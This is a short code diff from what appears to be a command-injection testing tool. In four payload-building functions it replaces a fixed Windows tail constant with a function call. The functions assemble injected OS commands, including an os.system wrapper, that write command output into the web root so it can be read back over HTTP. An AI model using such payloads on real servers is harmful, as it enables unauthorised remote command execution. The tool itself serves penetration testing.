@@ -39,7 +39,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
     # The marker is read back from the file over HTTP, so writing it is all the payload has to do.
     payload = (chain +
               settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              settings.SINGLE_WHITESPACE + "'" + TAG + "'" + checks.WINDOWS_TAIL
+              settings.SINGLE_WHITESPACE + "'" + TAG + "'" + checks.windows_tail(chain)
               )
   else:
     payload = (separator +
@@ -72,7 +72,7 @@ def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
       return ""
     payload = (chain +
               settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + windows_output_path(OUTPUT_TEXTFILE) + "','w').write('" + TAG + "')\"" +
-              checks.WINDOWS_TAIL
+              checks.windows_tail(chain)
               )
   else:
     payload = (separator +
@@ -114,7 +114,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     # The output is read back from the file, so it is redirected there rather than printed.
     payload = (chain +
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              checks.WINDOWS_TAIL
+              checks.windows_tail(chain)
               )
   else:
     settings.USER_APPLIED_CMD = cmd
@@ -140,7 +140,7 @@ def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
     else:
       payload = (chain +
                 settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + windows_output_path(OUTPUT_TEXTFILE) + "')\"" +
-                checks.WINDOWS_TAIL
+                checks.windows_tail(chain)
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
